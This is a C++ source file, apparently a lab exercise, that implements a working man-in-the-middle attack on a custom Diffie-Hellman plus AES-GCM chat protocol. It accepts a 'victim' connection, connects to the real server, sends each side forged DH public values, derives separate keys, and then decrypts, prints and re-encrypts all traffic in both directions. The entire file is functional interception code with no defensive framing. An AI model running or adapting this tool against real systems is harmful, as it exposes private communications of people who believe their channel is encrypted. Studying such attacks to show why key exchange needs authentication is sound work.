#include <openssl/bn.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstring>
#include <iomanip>
#include <iostream>
using namespace std;
#include <sstream>
#include <string>
#include <thread>
#include <vector>

static string hex_of(const unsigned char *p, size_t n)
{
    ostringstream out;
    for (size_t i = 0; i < n; ++i)
    {
        out << hex << setw(2) << setfill('0') << static_cast<int>(p[i]);
    }
    return out.str();
}

static string b64(const unsigned char *p, int n)
{
    string out(4 * ((n + 2) / 3), '\0');
    int written = EVP_EncodeBlock(reinterpret_cast<unsigned char *>(out.data()), p, n);
    out.resize(written);
    return out;
}

static vector<unsigned char> unb64(const string &s)
{
    vector<unsigned char> out((s.size() * 3) / 4 + 4);
    int n = EVP_DecodeBlock(out.data(), reinterpret_cast<const unsigned char *>(s.data()), static_cast<int>(s.size()));
    if (n < 0)
    {
        return {};
    }
    int pad = 0;
    if (!s.empty() && s.back() == '=')
    {
        ++pad;
    }
    if (s.size() > 1 && s[s.size() - 2] == '=')
    {
        ++pad;
    }
    out.resize(n - pad);
    return out;
}

static string recv_line(int fd, size_t maxlen = 1024 * 1024)
{
    string s;
    char c = '\0';
    while (s.size() < maxlen)
    {
        ssize_t n = recv(fd, &c, 1, 0);
        if (n <= 0)
        {
            return {};
        }
        if (c == '\n')
        {
            return s;
        }
        s.push_back(c);
    }
    return {};
}

static bool send_all(int fd, const string &s)
{
    size_t off = 0;
    while (off < s.size())
    {
        ssize_t n = send(fd, s.data() + off, s.size() - off, MSG_NOSIGNAL);
        if (n <= 0)
        {
            return false;
        }
        off += static_cast<size_t>(n);
    }
    return true;
}

static bool send_line(int fd, const string &s)
{
    return send_all(fd, s + "\n");
}

static BIGNUM *bn_from_hex(const char *s)
{
    BIGNUM *x = nullptr;
    BN_hex2bn(&x, s);
    return x;
}

static string bn_to_hex(const BIGNUM *value)
{
    char *tmp = BN_bn2hex(value);
    string out = tmp ? tmp : "";
    OPENSSL_free(tmp);
    return out;
}

static bool dh_make(BIGNUM *p, BIGNUM *g, BIGNUM **priv, BIGNUM **pub)
{
    *priv = BN_new();
    *pub = BN_new();
    BN_CTX *ctx = BN_CTX_new();
    if (!*priv || !*pub || !ctx)
    {
        BN_CTX_free(ctx);
        return false;
    }
    bool ok = BN_priv_rand(*priv, BN_num_bits(p) - 1, BN_RAND_TOP_TWO, BN_RAND_BOTTOM_ANY) == 1;
    ok = ok && BN_mod_exp(*pub, g, *priv, p, ctx) == 1;
    BN_CTX_free(ctx);
    return ok;
}

static BIGNUM *dh_shared(const BIGNUM *peer, const BIGNUM *priv, const BIGNUM *p)
{
    BIGNUM *secret = BN_new();
    BN_CTX *ctx = BN_CTX_new();
    if (!secret || !ctx)
    {
        BN_free(secret);
        BN_CTX_free(ctx);
        return nullptr;
    }
    if (BN_mod_exp(secret, peer, priv, p, ctx) != 1)
    {
        BN_free(secret);
        secret = nullptr;
    }
    BN_CTX_free(ctx);
    return secret;
}

static vector<unsigned char> derive_key(const BIGNUM *secret)
{
    int n = BN_num_bytes(secret);
    vector<unsigned char> raw(n);
    BN_bn2bin(secret, raw.data());
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(raw.data(), raw.size(), hash);
    return vector<unsigned char>(hash, hash + SHA256_DIGEST_LENGTH);
}

static string fingerprint(const vector<unsigned char> &key)
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(key.data(), key.size(), hash);
    return hex_of(hash, SHA256_DIGEST_LENGTH);
}

static string gcm_encrypt(const vector<unsigned char> &key, const string &plain)
{
    unsigned char nonce[12];
    if (RAND_bytes(nonce, sizeof(nonce)) != 1)
    {
        return {};
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx)
    {
        return {};
    }

    vector<unsigned char> ciphertext(plain.size() + 16);
    int part1 = 0;
    int part2 = 0;
    bool ok = EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) == 1;
    ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, sizeof(nonce), nullptr) == 1;
    ok = ok && EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce) == 1;
    ok = ok && EVP_EncryptUpdate(ctx, ciphertext.data(), &part1,
                                 reinterpret_cast<const unsigned char *>(plain.data()),
                                 static_cast<int>(plain.size())) == 1;
    ok = ok && EVP_EncryptFinal_ex(ctx, ciphertext.data() + part1, &part2) == 1;

    unsigned char tag[16];
    ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag) == 1;
    EVP_CIPHER_CTX_free(ctx);
    if (!ok)
    {
        return {};
    }

    vector<unsigned char> wire(nonce, nonce + sizeof(nonce));
    wire.insert(wire.end(), ciphertext.begin(), ciphertext.begin() + part1 + part2);
    wire.insert(wire.end(), tag, tag + sizeof(tag));
    return "ENC|" + b64(wire.data(), static_cast<int>(wire.size()));
}

static bool gcm_decrypt(const vector<unsigned char> &key, const string &msg, string &plain)
{
    if (msg.rfind("ENC|", 0) != 0)
    {
        return false;
    }

    auto wire = unb64(msg.substr(4));
    if (wire.size() < 28)
    {
        return false;
    }

    const unsigned char *nonce = wire.data();
    const unsigned char *ciphertext = wire.data() + 12;
    const unsigned char *tag = wire.data() + wire.size() - 16;
    int ciphertext_len = static_cast<int>(wire.size()) - 28;

    vector<unsigned char> out(ciphertext_len + 1);
    int part1 = 0;
    int part2 = 0;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx)
    {
        return false;
    }

    bool ok = EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) == 1;
    ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr) == 1;
    ok = ok && EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce) == 1;
    ok = ok && EVP_DecryptUpdate(ctx, out.data(), &part1, ciphertext, ciphertext_len) == 1;
    ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, const_cast<unsigned char *>(tag)) == 1;
    ok = ok && EVP_DecryptFinal_ex(ctx, out.data() + part1, &part2) == 1;
    EVP_CIPHER_CTX_free(ctx);

    if (!ok)
    {
        return false;
    }

    plain.assign(reinterpret_cast<char *>(out.data()), part1 + part2);
    return true;
}

static void free_bn(BIGNUM *&x)
{
    BN_free(x);
    x = nullptr;
}

static bool expect_prefix(const string &line, const string &prefix, string &value)
{
    if (line.rfind(prefix, 0) != 0)
    {
        return false;
    }
    value = line.substr(prefix.size());
    return true;
}

static int connect_to(const string &ip, int port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
    {
        return -1;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) != 1 || connect(fd, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) < 0)
    {
        close(fd);
        return -1;
    }
    return fd;
}

static bool relay_one(int in_fd, int out_fd, const vector<unsigned char> &in_key,
                      const vector<unsigned char> &out_key, const string &label)
{
    string wire = recv_line(in_fd);
    if (wire.empty())
    {
        return false;
    }

    string plain;
    if (!gcm_decrypt(in_key, wire, plain))
    {
        cerr << "[MITM] " << label << " authentication failure\n";
        return false;
    }

    cout << "[MITM " << label << " PLAINTEXT] " << plain << "\n";
    string rewrapped = gcm_encrypt(out_key, plain);
    return !rewrapped.empty() && send_line(out_fd, rewrapped);
}

int main(int argc, char **argv)
{
    if (argc < 2 || argc > 4)
    {
        cerr << "Usage: " << argv[0] << " <server-ip> [server-port] [listen-port]\n";
        return 1;
    }

    string server_ip = argv[1];
    int server_port = argc >= 3 ? stoi(argv[2]) : 5000;
    int listen_port = argc == 4 ? stoi(argv[3]) : 6000;

    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd < 0)
    {
        perror("socket");
        return 1;
    }

    int one = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(listen_port);
    if (bind(listen_fd, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) < 0)
    {
        perror("bind");
        close(listen_fd);
        return 1;
    }

    if (listen(listen_fd, 1) < 0)
    {
        perror("listen");
        close(listen_fd);
        return 1;
    }

    cout << "[MITM] listening on port " << listen_port << "\n";

    int victim_fd = accept(listen_fd, nullptr, nullptr);
    if (victim_fd < 0)
    {
        perror("accept");
        close(listen_fd);
        return 1;
    }

    int server_fd = connect_to(server_ip, server_port);
    if (server_fd < 0)
    {
        perror("connect");
        close(victim_fd);
        close(listen_fd);
        return 1;
    }

    string p_hex;
    string g_hex;
    string server_pub_hex;
    if (!expect_prefix(recv_line(server_fd), "DH_P|", p_hex) ||
        !expect_prefix(recv_line(server_fd), "DH_G|", g_hex) ||
        !expect_prefix(recv_line(server_fd), "DH_PUB|", server_pub_hex))
    {
        cerr << "[MITM] failed to read server handshake\n";
        close(victim_fd);
        close(server_fd);
        close(listen_fd);
        return 1;
    }

    BIGNUM *p = bn_from_hex(p_hex.c_str());
    BIGNUM *g = BN_new();
    BIGNUM *victim_priv = nullptr;
    BIGNUM *victim_pub = nullptr;
    BIGNUM *server_priv = nullptr;
    BIGNUM *server_pub = nullptr;
    BIGNUM *victim_peer = nullptr;
    BIGNUM *real_server_peer = bn_from_hex(server_pub_hex.c_str());
    BIGNUM *victim_secret = nullptr;
    BIGNUM *server_secret = nullptr;

    if (!p || !g || BN_set_word(g, 2) != 1 ||
        !real_server_peer || !dh_make(p, g, &victim_priv, &victim_pub) ||
        !dh_make(p, g, &server_priv, &server_pub))
    {
        cerr << "[MITM] failed to initialize DH state\n";
        return 1;
    }

    if (!send_line(victim_fd, "DH_P|" + p_hex) ||
        !send_line(victim_fd, "DH_G|" + g_hex) ||
        !send_line(victim_fd, "DH_PUB|" + bn_to_hex(victim_pub)) ||
        !send_line(server_fd, "DH_PUB|" + bn_to_hex(server_pub)))
    {
        cerr << "[MITM] failed to send forged handshake\n";
        return 1;
    }

    {
        string victim_pub_hex;
        if (!expect_prefix(recv_line(victim_fd), "DH_PUB|", victim_pub_hex))
        {
            cerr << "[MITM] victim did not send DH public value\n";
            return 1;
        }
        victim_peer = bn_from_hex(victim_pub_hex.c_str());
    }

    if (!victim_peer)
    {
        cerr << "[MITM] invalid victim DH public value\n";
        return 1;
    }

    victim_secret = dh_shared(victim_peer, victim_priv, p);
    server_secret = dh_shared(real_server_peer, server_priv, p);
    if (!victim_secret || !server_secret)
    {
        cerr << "[MITM] failed to derive shared secrets\n";
        return 1;
    }

    auto victim_key = derive_key(victim_secret);
    auto server_key = derive_key(server_secret);
    cout << "[MITM] victim-side fingerprint: " << fingerprint(victim_key) << "\n";
    cout << "[MITM] server-side fingerprint: " << fingerprint(server_key) << "\n";

    string victim_ok = recv_line(victim_fd);
    if (victim_ok != "DH_OK" || !send_line(server_fd, "DH_OK"))
    {
        cerr << "[MITM] handshake completion failed\n";
        return 1;
    }

    thread to_server([&]()
                     {
        while (relay_one(victim_fd, server_fd, victim_key, server_key, "C->S"))
        {
        } });
    thread to_victim([&]()
                     {
        while (relay_one(server_fd, victim_fd, server_key, victim_key, "S->C"))
        {
        } });

    to_server.join();
    shutdown(server_fd, SHUT_RDWR);
    shutdown(victim_fd, SHUT_RDWR);
    to_victim.join();

    close(victim_fd);
    close(server_fd);
    close(listen_fd);

    free_bn(p);
    free_bn(g);
    free_bn(victim_priv);
    free_bn(victim_pub);
    free_bn(server_priv);
    free_bn(server_pub);
    free_bn(victim_peer);
    free_bn(real_server_peer);
    free_bn(victim_secret);
    free_bn(server_secret);
    return 0;
}
